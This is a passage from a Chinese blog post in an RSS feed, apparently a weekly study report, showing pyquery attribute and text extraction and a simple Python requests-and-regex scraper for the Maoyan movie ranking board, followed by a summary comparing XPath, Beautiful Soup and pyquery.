class="line">print(a.attr('href'))</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link3.html"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"bold"</span>&gt;</span>third item<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="tag">&lt;<span class="name">class</span> '<span class="attr">pyquery.pyquery.PyQuery</span>'&gt;</span></span><br><span class="line">link3.html</span><br></pre></td></tr></table></figure><br>首先选中class为item-0和active的li节点内的a节点，它的类型是pyquery类型<br>然后调用attr()方法，再传入属性的名称，就可以得到这个属性的值</p><p>也可以调用attr属性来获取属性<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">print</span>(<span class="selector-tag">a</span><span class="selector-class">.attr</span><span class="selector-class">.href</span>)</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line"><span class="selector-tag">link3</span><span class="selector-class">.html</span></span><br></pre></td></tr></table></figure><br>这两种方法完全一样</p><p>attr()方法只会得到第一个节点的属性</p><p>想要获取所有a节点的属性，就要用到前面所说的遍历：<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">from</span> pyquery import PyQuery <span class="keyword">as</span> pq</span><br><span class="line">doc = pq(html)</span><br><span class="line"><span class="keyword">a</span> = doc(<span class="string">'a'</span>)</span><br><span class="line"><span class="keyword">for</span> <span class="keyword">item</span> <span class="keyword">in</span> <span class="keyword">a</span>.<span class="keyword">items</span>():</span><br><span class="line">    print(<span class="keyword">item</span>.attr(<span class="string">'href'</span>))</span><br><span class="line">    </span><br><span class="line">输出结果：</span><br><span class="line">link2.html</span><br><span class="line">link3.html</span><br><span class="line">link4.html</span><br><span class="line">link5.html</span><br></pre></td></tr></table></figure></p><h3 id="获取文本"><a href="#获取文本" class="headerlink" title="获取文本"></a>获取文本</h3><p>获取节点之后的另一个主要操作就是获取内部的文本了，我们可以调用text()方法来实现：<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">html = '''</span><br><span class="line">&lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"wrap"</span>&gt;</span><br><span class="line">    &lt;<span class="keyword">div</span> <span class="built_in">id</span>=<span class="string">"container"</span>&gt;</span><br><span class="line">        &lt;ul <span class="built_in">class</span>=<span class="string">"list"</span>&gt;</span><br><span class="line">             &lt;li <span class="built_in">class</span>=<span class="string">"item-0"</span>&gt;<span class="keyword">first</span> <span class="built_in">item</span>&lt;/li&gt;</span><br><span class="line">             &lt;li <span class="built_in">class</span>=<span class="string">"item-1"</span>&gt;&lt;a href=<span class="string">"link2.html"</span>&gt;<span class="keyword">second</span> <span class="built_in">item</span>&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">             &lt;li <span class="built_in">class</span>=<span class="string">"item-0 active"</span>&gt;&lt;a href=<span class="string">"link3.html"</span>&gt;&lt;span <span class="built_in">class</span>=<span class="string">"bold"</span>&gt;<span class="keyword">third</span> <span class="built_in">item</span>&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">             &lt;li <span class="built_in">class</span>=<span class="string">"item-1 active"</span>&gt;&lt;a href=<span class="string">"link4.html"</span>&gt;<span class="keyword">fourth</span> <span class="built_in">item</span>&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">             &lt;li <span class="built_in">class</span>=<span class="string">"item-0"</span>&gt;&lt;a href=<span class="string">"link5.html"</span>&gt;<span class="keyword">fifth</span> <span class="built_in">item</span>&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">         &lt;/ul&gt;</span><br><span class="line">     &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line"> &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">'''</span><br><span class="line"><span class="keyword">from</span> pyquery import PyQuery <span class="keyword">as</span> pq</span><br><span class="line">doc = pq(html)</span><br><span class="line">a = doc('.<span class="built_in">item</span><span class="number">-0.</span>active a')</span><br><span class="line">print(a)</span><br><span class="line">print(a.<span class="built_in">text</span>())</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">&lt;a href=<span class="string">"link3.html"</span>&gt;&lt;span <span class="built_in">class</span>=<span class="string">"bold"</span>&gt;<span class="keyword">third</span> <span class="built_in">item</span>&lt;/span&gt;&lt;/a&gt;</span><br><span class="line"><span class="keyword">third</span> <span class="built_in">item</span></span><br></pre></td></tr></table></figure></p><h1 id="抓取猫眼电影排行"><a href="#抓取猫眼电影排行" class="headerlink" title="抓取猫眼电影排行"></a>抓取猫眼电影排行</h1><p>因为这周目标只想把解析器结束，所以看的不是很多，打算做一个简单的实验，抓取一下猫眼电影的排行</p><h2 id="抓取分析"><a href="#抓取分析" class="headerlink" title="抓取分析"></a>抓取分析</h2><p>访问站点<a href="https://maoyan.com/board/4,打开之后便可以查看到榜单信息" target="_blank" rel="noopener">https://maoyan.com/board/4,打开之后便可以查看到榜单信息</a><br><img src="/images/python3/maoyan0.png" alt="avatar"></p><p>接下来换页，发现URL变成了<a href="https://maoyan.com/board/4?offset=10" target="_blank" rel="noopener">https://maoyan.com/board/4?offset=10</a></p><p>URL比之前多了一个参数，而结果显示的是排行11-20名的电源，所以推断这个是一个偏移量的参数，如果排行是21-30的电影的话，参数就会变为20</p><h2 id="抓取首页"><a href="#抓取首页" class="headerlink" title="抓取首页"></a>抓取首页</h2><p>爬取内容之前，先用抓取源码测试一下是否连通<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"><span class="attribute">url</span>=<span class="string">"https://maoyan.com/board/4?offset=0"</span></span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="attribute">response</span>=requests.get(url,headers=headers)</span><br><span class="line"><span class="keyword">if</span> response.<span class="attribute">status_code</span>==200:</span><br><span class="line">    <span class="builtin-name">print</span>(response.text)</span><br></pre></td></tr></table></figure><br>运行之后就可以得到源码，证明可以抓取到</p><h2 id="正则提取"><a href="#正则提取" class="headerlink" title="正则提取"></a>正则提取</h2><p>F12打开开发者工具，在Network监听组件中，就可以查看到源代码</p><p>利用霸王别姬的来做分析<br><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"> <span class="tag">&lt;<span class="name">dd</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"board-index board-index-1"</span>&gt;</span>1<span class="tag">&lt;/<span class="name">i</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/films/1203"</span> <span class="attr">title</span>=<span class="string">"霸王别姬"</span> <span class="attr">class</span>=<span class="string">"image-link"</span> <span class="attr">data-act</span>=<span class="string">"boarditem-click"</span> <span class="attr">data-val</span>=<span class="string">"</span></span></span><span class="template-variable">&#123;movieId:1203&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"//s3plus.meituan.net/v1/mss_e2821d7f0cfe4ac1bf9202ecf9590e67/cdn-prod/file:5788b470/image/loading_2.e3d934bf.png"</span> <span class="attr">alt</span>=<span class="string">""</span> <span class="attr">class</span>=<span class="string">"poster-default"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">img</span> <span class="attr">data-src</span>=<span class="string">"https://p0.meituan.net/movie/ce4da3e03e655b5b88ed31b5cd7896cf62472.jpg@160w_220h_1e_1c"</span> <span class="attr">alt</span>=<span class="string">"霸王别姬"</span> <span class="attr">class</span>=<span class="string">"board-img"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"board-item-main"</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"board-item-content"</span>&gt;</span></span></span><br><span class="line"><span class="xml">              <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"movie-item-info"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"name"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/films/1203"</span> <span class="attr">title</span>=<span class="string">"霸王别姬"</span> <span class="attr">data-act</span>=<span class="string">"boarditem-click"</span> <span class="attr">data-val</span>=<span class="string">"</span></span></span><span class="template-variable">&#123;movieId:1203&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span>霸王别姬<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"star"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                主演：张国荣,张丰毅,巩俐</span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"releasetime"</span>&gt;</span>上映时间：1993-07-26<span class="tag">&lt;/<span class="name">p</span>&gt;</span>    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"movie-item-number score-num"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"score"</span>&gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"integer"</span>&gt;</span>9.<span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fraction"</span>&gt;</span>5<span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span>        </span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>可以看到与这个排行相关的都套在一个dd节点中</p><p>并且电源的排行信息是class为board-index的i节点内<br>所以构造正则就是<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dd</span>&gt;</span>.*?board-index.*?&gt;(.*?)<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br></pre></td></tr></table></figure><br>还需要提取到电影的图片，仅检查后发现，a标签中的第二个img节点的data-src后面跟的是图片的地址<br>所以正则为<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="params">&lt;dd&gt;</span>.*?board-index.*?&gt;(.*?)<span class="params">&lt;/i&gt;</span>.*?data-src=<span class="string">"(.*?)"</span></span><br></pre></td></tr></table></figure><br>还需要提取电影的名称，它在p节点内，class为name，所以正则修改为<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;dd&gt;.*?board-index.*<span class="meta">?&gt;</span>(.*?)&lt;/i&gt;.*?data-src=<span class="string">"(.*?)"</span>.*?name.*?<span class="keyword">a</span>.*<span class="meta">?&gt;</span>(.*?)&lt;/<span class="keyword">a</span>&gt;</span><br></pre></td></tr></table></figure><br>用正则表达式测试工具测试之后，成功得到数据<br><img src="/images/python3/maoyan1.png" alt="avatar"></p><p>测试代码为：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">pattern</span>=re.compile('&lt;dd&gt;.*?board-index.*?&gt;(.*?)&lt;/i&gt;.*?data-src="(.*?)".*?name.*?a.*?&gt;(.*?)&lt;/a&gt;',re.S)</span><br><span class="line"><span class="attribute">items</span>=re.findall(pattern,html)</span><br><span class="line"><span class="builtin-name">print</span>(items)</span><br></pre></td></tr></table></figure></p><h2 id="最后代码"><a href="#最后代码" class="headerlink" title="最后代码"></a>最后代码</h2><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import <span class="built_in">time</span></span><br><span class="line"></span><br><span class="line">def geturl(i):</span><br><span class="line">    url=<span class="string">"https://maoyan.com/board/4?offset="</span>+<span class="built_in">str</span>(i)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36'</span>,</span><br><span class="line">        <span class="string">'Accept'</span>:<span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'</span></span><br><span class="line">    &#125;</span><br><span class="line">    response=requests.get(url,headers=headers,allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    <span class="meta"># print(response.content.decode(<span class="meta-string">'utf-8'</span>))</span></span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">'&lt;dd&gt;.*?board-index.*?&gt;(.*?)&lt;/i&gt;.*?data-src="(.*?)".*?name.*?a.*?&gt;(.*?)&lt;/a&gt;'</span>, re.S)</span><br><span class="line">    <span class="built_in">items</span> = re.findall(pattern, response.<span class="built_in">text</span>)</span><br><span class="line">    print(<span class="built_in">items</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="variable">__name__</span> == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="built_in">in</span> range(<span class="number">10</span>):</span><br><span class="line">        geturl(i * <span class="number">10</span>)</span><br><span class="line">        <span class="built_in">time</span>.<span class="built_in">sleep</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.pyquery的CSS选择器方式对于熟悉html的人来说，更容易上手，但是功能相对于beautiful soup较为简单</p><p>2.beautiful soup , xpath , pyquery这三个解析器中，xpath是基础，beautiful soup功能较为复杂，但是更加灵活，pyquery较为简单，适合简单的工作</p><p>3.总结下来三个选择器常用的方法都差不多，查询子节点用children()，查询父母节点用parent()，祖先节点用parents()，查询属性用attrs() pyquery用attr()，获取文本用text()</p><p>4.使用pyquery前，需要实例化一个对象，而XPATH使用时只需要导入etree库，就可以使用，beautiful soup只需要导入Beautiful soup库，直接soup后面接方法即可</p><p>5.后两个解析器几乎都是由Xpath衍生出来的，目前最常用的是Xpath和beautiful soup</p><p>6.通过带师傅的讲解，明白了需要用函数来规范会操作，方便读代码和逻辑方面</p><p>7.当遇到重定向问题时，request库中的allow_redirects参数，可以禁止自动重定向</p><p>8.如果遇到反爬虫机制，可以采用time.sleep来让其延时等待，还可以BP抓包，讲headers的数据全部添加进去，模拟登录</p>]]></content:encoded>
      
      <comments>http://yoursite.com/2020/04/11/Python3-2020-4-11-%E5%91%A8%E6%8A%A57/#disqus_thread</comments>
    </item>
    
  </channel>
</rss>
